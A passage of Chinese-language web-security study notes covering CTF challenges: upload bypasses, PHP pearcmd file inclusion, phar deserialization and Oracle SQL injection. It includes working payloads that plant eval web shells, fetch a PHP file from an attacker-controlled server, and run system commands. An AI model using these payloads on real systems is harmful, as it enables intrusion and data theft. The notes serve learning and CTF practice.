title="黑名单（过滤全木马）"></a>黑名单（过滤全木马）</h3></li></ul><p>上传<code>.htaccess</code>文件<br>可以让更多的文件类型解析为php<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory /&gt;</span><br><span class="line">  Options +Indexes +FollowSymLinks +ExecCGI</span><br><span class="line">  AllowOverride All</span><br><span class="line">  Order allow,deny</span><br><span class="line">  Allow from all</span><br><span class="line">  Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>上传<code>.user.ini</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=test.txt</span><br></pre></td></tr></table></figure><ul><li><h3 id="文件名处理逻辑"><a href="#文件名处理逻辑" class="headerlink" title="文件名处理逻辑"></a>文件名处理逻辑</h3></li></ul><p>加点，加空格，双写，0x00阶段<br>不重复写了</p><h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><h3 id="php-pear文件包含漏洞"><a href="#php-pear文件包含漏洞" class="headerlink" title="php pear文件包含漏洞"></a>php pear文件包含漏洞</h3><p>全称为PHP Extension and Application Repository<br>开启了register_argc_argv这个选项<br>url中?后面的内容都会传入$_SERVER[‘argv’]这个变量里<br>argv是通过+作为分隔符<br>pear文件源码:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  PHP=<span class="string">&quot;<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/share/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    INCDIR=`<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/php&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=0 -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure><p>当执行了pear时，会将$_SERVER[‘argv’]当作参数一起执行，从而自动拉取了指定的php文件</p><ul><li><h3 id="newstarctf-2023公开赛道include-🍐"><a href="#newstarctf-2023公开赛道include-🍐" class="headerlink" title="newstarctf 2023公开赛道include 🍐"></a>newstarctf 2023公开赛道include 🍐</h3></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示找到<code>phpinfo.php</code><br>发现<code>fake&#123;Check_register_argc_argv&#125;</code><br>于是查看<code>register_argc_argv</code>都是on<br>且php服务的路径为<code>/usr/local/etc/php</code><br>而当前网页的路径为<code>SCRIPT_FILENAME/var/www/html/index.php</code><br>所以可以使用pearcmd.php进行命令的执行<br>pear命令可使用的参数:<br><img src="/2025/06/10/Upload-LFI-plus/1.png"><br>构造:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;+/var/www/html/a.php</span><br></pre></td></tr></table></figure><p>在服务器中运行的命令实际为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create &quot;/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=eval($_POST[1]);?&gt;&quot; /var/www/html/a.php</span><br></pre></td></tr></table></figure><p>最后包含a.php即可完成getshell<br><em>PS:尖括号用burpsuite发</em><br><a href="https://whhxy4.github.io/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#:~:text=PHP%E8%A3%B8%E6%96%87%E4%BB%B6">https://whhxy4.github.io/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#:~:text=PHP%E8%A3%B8%E6%96%87%E4%BB%B6</a></p><ul><li><h3 id="极客大挑战2024-ez-include"><a href="#极客大挑战2024-ez-include" class="headerlink" title="[极客大挑战2024]ez_include"></a>[极客大挑战2024]ez_include</h3></li></ul><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个绕过require_once包含限制的题<br>详见<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></pre></td></tr></table></figure><p>成功进入第二步&#x2F;levelllll2.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到register_argc_argv &#x3D; On,可能是pear文件包含漏洞<br>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps地址:vps端口/1.php</span><br></pre></td></tr></table></figure><p>成功getshell</p><h1 id="CVE-2024-2961"><a href="#CVE-2024-2961" class="headerlink" title="CVE-2024-2961"></a>CVE-2024-2961</h1><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><h1 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h1><p>phar支持对一些压缩包的操作<br>不过只支持<code>.zip</code>和<code>.tar</code>格式的</p><ul><li><h3 id="phar伪协议的利用"><a href="#phar伪协议的利用" class="headerlink" title="phar伪协议的利用"></a>phar伪协议的利用</h3></li></ul><p>例如我们写一个<code>test.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其压缩为<code>test.zip</code><br>然后直接修改文件名为<code>test.jpg</code><br>就可以正常上传</p><p>如果有一个<code>include</code>的文件包含点<br>就可以利用<code>phar</code>伪协议包含文件里面的内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://./test.jpg/test.php&#x27;</span>); </span><br><span class="line"><span class="comment">// 执行压缩包内的test.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</span><br></pre></td></tr></table></figure><p>这让我想起<code>shiro</code>的<code>cookie</code>反序列化</p><ul><li><h5 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h5></li></ul><p>A stub：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stub的基本结构：&lt;?php HALT_COMPILER();</span><br><span class="line">stub必须以HALT_COMPILER();来作为结束部分，</span><br><span class="line">否则Phar拓展将不会识别该文件。</span><br></pre></td></tr></table></figure><p>a manifest describing the contents:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Phar文件中被压缩的文件的一些信息，</span><br><span class="line">其中Meta-data部分的信息会以反序列化的形式储存，</span><br><span class="line">这里就是漏洞利用的关键点</span><br></pre></td></tr></table></figure><p><img src="/2025/06/10/Upload-LFI-plus/1.png" alt="alt text"><br>the file contents:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被压缩的文件内容，在没有特殊要求的情况下，</span><br><span class="line">这个被压缩的文件内容可以随便写的，</span><br><span class="line">因为我们利用这个漏洞主要是为了触发它的反序列化</span><br></pre></td></tr></table></figure><p>a signature for verifying Phar integrity：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">签名格式</span><br></pre></td></tr></table></figure><p><img src="/2025/06/10/Upload-LFI-plus/2.png" alt="alt text"></p><p>生成一个phar:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();    <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>具体的利用方式：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恶意类：包含可被利用的魔术方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当对象被销毁时执行系统命令（反序列化触发点）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);  <span class="comment">// 高危操作：执行任意系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;exploit.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exploit.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建恶意对象而非 Test 对象</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MaliciousClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&quot;touch /tmp/hacked&quot;</span>;  <span class="comment">// 修改此处执行任意命令（如反弹shell）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);  <span class="comment">// 注入恶意对象到元数据</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Oracle Database，又名 Oracle RDBMS，或简称 Oracle。</span><br><span class="line">是甲骨文公司的一款关系数据库管理系统。</span><br><span class="line">它是在数据库领域一直处于领先地位的产品。</span><br><span class="line">可以说 Oracle 数据库系统是世界上流行的关系数据库管理系统，</span><br><span class="line">系统可移植性好、使用方便、功能强，</span><br><span class="line">适用于各类大、中、小微机环境。它是一种高效率的、</span><br><span class="line">可靠性好的、适应高吞吐量的数据库方案。</span><br></pre></td></tr></table></figure><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>• 查询数据库版本信息</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 无需特权</span></span><br><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> banner <span class="keyword">LIKE</span> <span class="string">&#x27;Oracle%&#x27;</span>;</span><br><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance;</span><br></pre></td></tr></table></figure><p>• 查询操作系统版本</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>• 查询数据库运行的主机名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> host_name <span class="keyword">FROM</span> v$instance;</span><br><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> UTL_INADDR.get_host_name(<span class="string">&#x27;127.0.0.1&#x27;</span>) <span class="keyword">FROM</span> dual;</span><br></pre></td></tr></table></figure><p>• 查询当前用户权限的所有数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner,table_name <span class="keyword">FROM</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span><span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><p>• 查询当前用户权限的所有数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 无需特权</span></span><br><span class="line"><span class="keyword">SELECT</span> global_name <span class="keyword">FROM</span> global_name;</span><br><span class="line"><span class="comment">-- 无需特权</span></span><br><span class="line"><span class="keyword">SELECT</span> SYS.DATABASE_NAME <span class="keyword">FROM</span> DUAL;</span><br><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> v$database;</span><br><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> instance_name <span class="keyword">FROM</span> v$instance;</span><br></pre></td></tr></table></figure><p>• 查询数据库所有用户</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 需要特权</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs <span class="keyword">WHERE</span> ADMIN_OPTION <span class="operator">=</span> <span class="string">&#x27;YES&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><p><a href="https://blog.csdn.net/Javachichi/article/details/128711756">https://blog.csdn.net/Javachichi/article/details/128711756</a></p><ul><li><p>判断数据库类型</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 使用 Oracle 专有的函数判断是否为 Oracle 数据库</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; or to_char(1)=1--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">or</span> to_number(<span class="string">&#x27;2e0&#x27;</span>)<span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>查询表名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select table_name from user_tables where rownum=1),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">&lt;&gt;</span><span class="string">&#x27;BONUS&#x27;</span>),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;</span>BONUS<span class="string">&#x27;,&#x27;</span>DEPT<span class="string">&#x27;)),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;BONUS&#x27;</span>,<span class="string">&#x27;DEPT&#x27;</span>,<span class="string">&#x27;EMP&#x27;</span>)),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select table_name from user_tables where rownum=1 and table_name not in (&#x27;</span>BONUS<span class="string">&#x27;,&#x27;</span>DEPT<span class="string">&#x27;,&#x27;</span>EMP<span class="string">&#x27;)),NULL from dual--+</span></span><br></pre></td></tr></table></figure></li><li><p>查询表中的字段名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select column_name from user_tab_columns where table_name=&#x27;</span>EMP<span class="string">&#x27; and rownum=1),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;EMP&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;EMPNO&#x27;</span>)),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select column_name from user_tab_columns where table_name=&#x27;</span>EMP<span class="string">&#x27; and rownum=1 and column_name not in (&#x27;</span>EMPNO<span class="string">&#x27;,&#x27;</span>ENAME<span class="string">&#x27;)),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;EMP&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;EMPNO&#x27;</span>,<span class="string">&#x27;ENAME&#x27;</span>,<span class="string">&#x27;JOB&#x27;</span>)),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select column_name from user_tab_columns where table_name=&#x27;</span>EMP<span class="string">&#x27; and rownum=1 and column_name not in (&#x27;</span>EMPNO<span class="string">&#x27;,&#x27;</span>ENAME<span class="string">&#x27;,&#x27;</span>JOB<span class="string">&#x27;,&#x27;</span>MGR<span class="string">&#x27;)),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;EMP&#x27;</span> <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;EMPNO&#x27;</span>,<span class="string">&#x27;ENAME&#x27;</span>,<span class="string">&#x27;JOB&#x27;</span>,<span class="string">&#x27;MGR&#x27;</span>,<span class="string">&#x27;HIREDATE&#x27;</span>)),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>查询具体的数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select ename from emp where rownum=1),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ename<span class="operator">&lt;&gt;</span><span class="string">&#x27;SMITH&#x27;</span>),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select ename from emp where rownum=1 and ename  not in (&#x27;</span>SMITH<span class="string">&#x27;,&#x27;</span>ALLEN<span class="string">&#x27;)),NULL from dual--+</span></span><br><span class="line"><span class="string">?ename=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,(<span class="keyword">select</span> ename <span class="keyword">from</span> emp <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ename  <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;SMITH&#x27;</span>,<span class="string">&#x27;ALLEN&#x27;</span>,<span class="string">&#x27;WARD&#x27;</span>)),<span class="keyword">NULL</span> <span class="keyword">from</span> dual<span class="comment">--+</span></span><br><span class="line">?ename<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select NULL,NULL,(select ename from emp where rownum=1 and ename  not in (&#x27;</span>SMITH<span class="string">&#x27;,&#x27;</span>ALLEN<span 